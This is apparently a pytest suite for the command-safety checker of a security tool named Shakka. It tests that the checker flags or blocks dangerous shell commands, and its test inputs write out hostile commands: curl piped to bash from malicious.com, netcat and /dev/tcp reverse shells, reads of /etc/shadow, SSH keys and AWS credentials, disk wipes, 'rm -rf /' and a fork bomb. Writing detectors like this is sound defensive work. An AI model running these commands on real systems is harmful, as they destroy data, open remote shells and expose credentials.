"""Tests for Command Safety Layer."""

import pytest

from shakka.config import ShakkaConfig
from shakka.core.safety import (
    SafetyChecker,
    SafetyConfig,
    SafetyResult,
    RiskCategory,
    RiskSeverity,
    RiskFinding,
    DANGER_PATTERNS,
)


class TestRiskFinding:
    """Tests for RiskFinding dataclass."""
    
    def test_create_finding(self):
        """Test creating a risk finding."""
        finding = RiskFinding(
            category=RiskCategory.DESTRUCTIVE,
            severity=RiskSeverity.HIGH,
            pattern_matched=r"rm\s+-rf",
            description="Recursive file deletion",
        )
        
        assert finding.category == RiskCategory.DESTRUCTIVE
        assert finding.severity == RiskSeverity.HIGH
        assert finding.description == "Recursive file deletion"
    
    def test_finding_with_recommendation(self):
        """Test finding with recommendation."""
        finding = RiskFinding(
            category=RiskCategory.DESTRUCTIVE,
            severity=RiskSeverity.CRITICAL,
            pattern_matched="test",
            description="Test description",
            recommendation="Do not run this",
        )
        
        assert finding.recommendation == "Do not run this"


class TestSafetyResult:
    """Tests for SafetyResult dataclass."""
    
    def test_safe_result(self):
        """Test safe result with no findings."""
        result = SafetyResult(
            command="nmap -sV 10.0.0.1",
            is_safe=True,
            is_blocked=False,
            requires_confirmation=False,
            findings=[],
        )
        
        assert result.is_safe is True
        assert result.highest_severity is None
        assert result.get_risk_summary() == "No risks identified"
    
    def test_unsafe_result(self):
        """Test unsafe result with findings."""
        result = SafetyResult(
            command="rm -rf /",
            is_safe=False,
            is_blocked=True,
            requires_confirmation=False,
            findings=[
                RiskFinding(
                    category=RiskCategory.DESTRUCTIVE,
                    severity=RiskSeverity.CRITICAL,
                    pattern_matched="test",
                    description="Destroys everything",
                ),
            ],
        )
        
        assert result.is_safe is False
        assert result.is_blocked is True
        assert result.highest_severity == RiskSeverity.CRITICAL
    
    def test_highest_severity_multiple_findings(self):
        """Test highest severity with multiple findings."""
        result = SafetyResult(
            command="sudo rm -rf /var/log/*",
            is_safe=False,
            is_blocked=False,
            requires_confirmation=True,
            findings=[
                RiskFinding(
                    category=RiskCategory.PRIVILEGE_ESCALATION,
                    severity=RiskSeverity.MEDIUM,
                    pattern_matched="sudo",
                    description="Requires root",
                ),
                RiskFinding(
                    category=RiskCategory.DESTRUCTIVE,
                    severity=RiskSeverity.HIGH,
                    pattern_matched="rm -rf",
                    description="Recursive deletion",
                ),
            ],
        )
        
        assert result.highest_severity == RiskSeverity.HIGH
    
    def test_get_risk_summary(self):
        """Test risk summary generation."""
        result = SafetyResult(
            command="test",
            is_safe=False,
            is_blocked=False,
            requires_confirmation=True,
            findings=[
                RiskFinding(
                    category=RiskCategory.DESTRUCTIVE,
                    severity=RiskSeverity.HIGH,
                    pattern_matched="test",
                    description="Risk one",
                ),
                RiskFinding(
                    category=RiskCategory.PRIVILEGE_ESCALATION,
                    severity=RiskSeverity.MEDIUM,
                    pattern_matched="test",
                    description="Risk two",
                ),
            ],
        )
        
        summary = result.get_risk_summary()
        assert "Risk one" in summary
        assert "Risk two" in summary


class TestSafetyConfig:
    """Tests for SafetyConfig dataclass."""
    
    def test_default_config(self):
        """Test default configuration values."""
        config = SafetyConfig()
        
        assert config.confirm_dangerous is True
        assert config.block_destructive is False
        assert config.yolo_mode is False
        assert config.enable_audit_log is True
        assert "rm -rf /" in config.blocked_commands
    
    def test_custom_config(self):
        """Test custom configuration."""
        config = SafetyConfig(
            confirm_dangerous=False,
            block_destructive=True,
            yolo_mode=True,
        )
        
        assert config.confirm_dangerous is False
        assert config.block_destructive is True
        assert config.yolo_mode is True


class TestSafetyChecker:
    """Tests for SafetyChecker class."""
    
    @pytest.fixture
    def checker(self):
        """Create a default safety checker."""
        return SafetyChecker()
    
    def test_safe_command(self, checker):
        """Test that safe commands pass."""
        result = checker.check("nmap -sV 10.0.0.1")
        
        assert result.is_safe is True
        assert result.is_blocked is False
        assert result.requires_confirmation is False
        assert len(result.findings) == 0
    
    def test_safe_gobuster_command(self, checker):
        """Test gobuster command is safe."""
        result = checker.check("gobuster dir -u http://example.com -w wordlist.txt")
        
        assert result.is_safe is True
        assert len(result.findings) == 0


class TestDestructivePatterns:
    """Tests for destructive command patterns."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_rm_rf_root(self, checker):
        """Test rm -rf / is detected as critical."""
        result = checker.check("rm -rf /")
        
        assert result.is_safe is False
        assert result.is_blocked is True  # In default blocklist
        assert any(f.severity == RiskSeverity.CRITICAL for f in result.findings)
    
    def test_rm_rf_star(self, checker):
        """Test rm -rf /* is detected."""
        result = checker.check("rm -rf /*")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.DESTRUCTIVE for f in result.findings)
    
    def test_rm_rf_home(self, checker):
        """Test rm -rf ~ is detected."""
        result = checker.check("rm -rf ~")
        
        assert result.is_safe is False
        assert any(f.severity == RiskSeverity.HIGH for f in result.findings)
    
    def test_rm_r_flag(self, checker):
        """Test rm with -r flag is detected."""
        result = checker.check("rm -r /tmp/test")
        
        assert result.is_safe is False
        assert result.requires_confirmation is True
    
    def test_mkfs(self, checker):
        """Test mkfs is detected as critical."""
        result = checker.check("mkfs.ext4 /dev/sda1")
        
        assert result.is_safe is False
        assert any(f.severity == RiskSeverity.CRITICAL for f in result.findings)
    
    def test_fork_bomb(self, checker):
        """Test fork bomb is blocked."""
        result = checker.check(":(){ :|:& };:")
        
        assert result.is_blocked is True


class TestPrivilegeEscalationPatterns:
    """Tests for privilege escalation patterns."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_sudo_detected(self, checker):
        """Test sudo commands are detected."""
        result = checker.check("sudo apt update")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.PRIVILEGE_ESCALATION for f in result.findings)
    
    def test_pipe_to_sudo(self, checker):
        """Test piping to sudo is detected as higher risk."""
        result = checker.check("echo 'data' | sudo tee /etc/config")
        
        assert result.is_safe is False
        assert any(
            f.category == RiskCategory.PRIVILEGE_ESCALATION and f.severity == RiskSeverity.HIGH
            for f in result.findings
        )
    
    def test_chmod_777(self, checker):
        """Test chmod 777 is detected."""
        result = checker.check("chmod 777 /var/www")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.PRIVILEGE_ESCALATION for f in result.findings)
    
    def test_chmod_suid(self, checker):
        """Test chmod +s is detected as high risk."""
        result = checker.check("chmod +s /usr/bin/custom")
        
        assert result.is_safe is False
        assert any(
            f.severity == RiskSeverity.HIGH
            for f in result.findings
        )
    
    def test_su_root(self, checker):
        """Test su root is detected."""
        result = checker.check("su root")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.PRIVILEGE_ESCALATION for f in result.findings)


class TestNetworkExfilPatterns:
    """Tests for network exfiltration patterns."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_curl_pipe_bash(self, checker):
        """Test curl | bash is detected as critical."""
        result = checker.check("curl http://malicious.com/script.sh | bash")
        
        assert result.is_safe is False
        assert any(
            f.category == RiskCategory.NETWORK_EXFIL and f.severity == RiskSeverity.CRITICAL
            for f in result.findings
        )
    
    def test_wget_pipe_sh(self, checker):
        """Test wget | sh is detected as critical."""
        result = checker.check("wget -O- http://example.com/install.sh | sh")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.NETWORK_EXFIL for f in result.findings)
    
    def test_netcat_reverse_shell(self, checker):
        """Test nc -e (reverse shell) is detected."""
        result = checker.check("nc -e /bin/bash 10.0.0.1 4444")
        
        assert result.is_safe is False
        assert any(f.severity == RiskSeverity.CRITICAL for f in result.findings)
    
    def test_bash_reverse_shell(self, checker):
        """Test bash reverse shell is detected."""
        result = checker.check("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.NETWORK_EXFIL for f in result.findings)


class TestCredentialExposurePatterns:
    """Tests for credential exposure patterns."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_cat_shadow(self, checker):
        """Test reading /etc/shadow is detected."""
        result = checker.check("cat /etc/shadow")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_cat_ssh_key(self, checker):
        """Test reading SSH keys is detected."""
        result = checker.check("cat ~/.ssh/id_rsa")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_cat_aws_creds(self, checker):
        """Test reading AWS credentials is detected."""
        result = checker.check("cat ~/.aws/credentials")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.CREDENTIAL_EXPOSURE for f in result.findings)
    
    def test_password_in_command(self, checker):
        """Test password in command line is detected."""
        result = checker.check("mysql --password=secret123 -u admin")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.CREDENTIAL_EXPOSURE for f in result.findings)


class TestDiskOperationPatterns:
    """Tests for disk operation patterns."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_dd_to_disk(self, checker):
        """Test dd to disk device is detected as critical."""
        result = checker.check("dd if=/dev/zero of=/dev/sda bs=4M")
        
        assert result.is_safe is False
        assert any(f.severity == RiskSeverity.CRITICAL for f in result.findings)
    
    def test_dd_from_disk(self, checker):
        """Test dd from disk device is detected."""
        result = checker.check("dd if=/dev/sda of=backup.img")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.DISK_OPERATION for f in result.findings)
    
    def test_wipefs(self, checker):
        """Test wipefs is detected as critical."""
        result = checker.check("wipefs -a /dev/sdb")
        
        assert result.is_safe is False
        assert any(f.severity == RiskSeverity.CRITICAL for f in result.findings)


class TestSystemModificationPatterns:
    """Tests for system modification patterns."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_shutdown(self, checker):
        """Test shutdown command is detected."""
        result = checker.check("shutdown -h now")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.SYSTEM_MODIFICATION for f in result.findings)
    
    def test_reboot(self, checker):
        """Test reboot command is detected."""
        result = checker.check("reboot")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.SYSTEM_MODIFICATION for f in result.findings)
    
    def test_systemctl_mask(self, checker):
        """Test systemctl mask is detected as high risk."""
        result = checker.check("systemctl mask nginx")
        
        assert result.is_safe is False
        assert any(f.severity == RiskSeverity.HIGH for f in result.findings)
    
    def test_clear_history(self, checker):
        """Test history -c is detected."""
        result = checker.check("history -c")
        
        assert result.is_safe is False
        assert any(f.category == RiskCategory.SYSTEM_MODIFICATION for f in result.findings)


class TestBlocklist:
    """Tests for blocklist functionality."""
    
    def test_default_blocklist(self):
        """Test default blocklist blocks dangerous commands."""
        checker = SafetyChecker()
        
        result = checker.check("rm -rf /")
        assert result.is_blocked is True
    
    def test_custom_blocklist(self):
        """Test custom blocklist."""
        config = SafetyConfig(blocked_commands=["dangerous_cmd"])
        checker = SafetyChecker(config=config)
        
        result = checker.check("dangerous_cmd arg1 arg2")
        assert result.is_blocked is True
    
    def test_blocked_pattern(self):
        """Test blocked patterns."""
        config = SafetyConfig(blocked_patterns=[r"DROP\s+TABLE"])
        checker = SafetyChecker(config=config)
        
        result = checker.check("DROP TABLE users;")
        assert result.is_blocked is True


class TestYoloMode:
    """Tests for yolo mode (skip confirmations)."""
    
    def test_yolo_mode_skips_confirmation(self):
        """Test yolo mode skips confirmation for dangerous commands."""
        config = SafetyConfig(yolo_mode=True)
        checker = SafetyChecker(config=config)
        
        result = checker.check("sudo rm -rf /var/log/*")
        
        # Still has findings but doesn't require confirmation
        assert result.is_safe is False
        assert result.requires_confirmation is False
    
    def test_yolo_mode_still_blocks(self):
        """Test yolo mode still blocks blocklisted commands."""
        config = SafetyConfig(yolo_mode=True)
        checker = SafetyChecker(config=config)
        
        result = checker.check("rm -rf /")
        
        assert result.is_blocked is True


class TestBlockDestructive:
    """Tests for block_destructive configuration."""
    
    def test_block_destructive_enabled(self):
        """Test block_destructive blocks high severity destructive commands."""
        config = SafetyConfig(block_destructive=True)
        checker = SafetyChecker(config=config)
        
        result = checker.check("rm -rf /home/user")
        
        assert result.is_blocked is True
    
    def test_block_destructive_disabled(self):
        """Test block_destructive disabled allows with confirmation."""
        config = SafetyConfig(block_destructive=False)
        checker = SafetyChecker(config=config)
        
        result = checker.check("rm -rf /home/user")
        
        assert result.is_blocked is False
        assert result.requires_confirmation is True


class TestAuditLog:
    """Tests for audit logging."""
    
    def test_audit_log_enabled(self):
        """Test audit log records checks."""
        config = SafetyConfig(enable_audit_log=True)
        checker = SafetyChecker(config=config)
        
        checker.check("nmap -sV 10.0.0.1")
        checker.check("sudo rm -rf /tmp/test")
        
        log = checker.get_audit_log()
        assert len(log) == 2
        assert log[0]["command"] == "nmap -sV 10.0.0.1"
        assert log[0]["is_safe"] is True
        assert log[1]["command"] == "sudo rm -rf /tmp/test"
        assert log[1]["is_safe"] is False
    
    def test_audit_log_disabled(self):
        """Test audit log can be disabled."""
        config = SafetyConfig(enable_audit_log=False)
        checker = SafetyChecker(config=config)
        
        checker.check("nmap -sV 10.0.0.1")
        
        log = checker.get_audit_log()
        assert len(log) == 0
    
    def test_clear_audit_log(self):
        """Test clearing audit log."""
        checker = SafetyChecker()
        checker.check("test command")
        
        assert len(checker.get_audit_log()) == 1
        
        checker.clear_audit_log()
        
        assert len(checker.get_audit_log()) == 0


class TestFormatWarning:
    """Tests for warning message formatting."""
    
    @pytest.fixture
    def checker(self):
        return SafetyChecker()
    
    def test_format_safe_command(self, checker):
        """Test formatting safe command returns empty string."""
        result = checker.check("nmap -sV 10.0.0.1")
        warning = checker.format_warning(result)
        
        assert warning == ""
    
    def test_format_critical_warning(self, checker):
        """Test formatting critical warning."""
        result = checker.check("rm -rf /")
        warning = checker.format_warning(result)
        
        assert "BLOCKED" in warning or "CRITICAL" in warning
        assert "rm -rf /" in warning
    
    def test_format_high_risk_warning(self, checker):
        """Test formatting high risk warning."""
        result = checker.check("rm -rf ~/important")
        warning = checker.format_warning(result)
        
        assert "HIGH RISK" in warning or "DETECTED" in warning
        assert "Risks identified:" in warning
    
    def test_format_includes_recommendations(self, checker):
        """Test that warnings include recommendations."""
        result = checker.check("sudo rm -rf /tmp/test")
        warning = checker.format_warning(result)
        
        assert "Recommendations:" in warning


class TestShakkaConfigSafety:
    """Tests for safety configuration in ShakkaConfig."""
    
    def test_default_safety_config(self):
        """Test default safety values in ShakkaConfig."""
        config = ShakkaConfig()
        
        assert config.safety_confirm_dangerous is True
        assert config.safety_block_destructive is False
        assert config.safety_yolo_mode is False
        assert config.safety_enable_audit is True
        assert "rm -rf /" in config.safety_blocked_commands
    
    def test_safety_config_from_env(self, monkeypatch):
        """Test safety settings from environment variables."""
        monkeypatch.setenv("SHAKKA_SAFETY_CONFIRM_DANGEROUS", "false")
        monkeypatch.setenv("SHAKKA_SAFETY_YOLO_MODE", "true")
        
        config = ShakkaConfig()
        
        assert config.safety_confirm_dangerous is False
        assert config.safety_yolo_mode is True
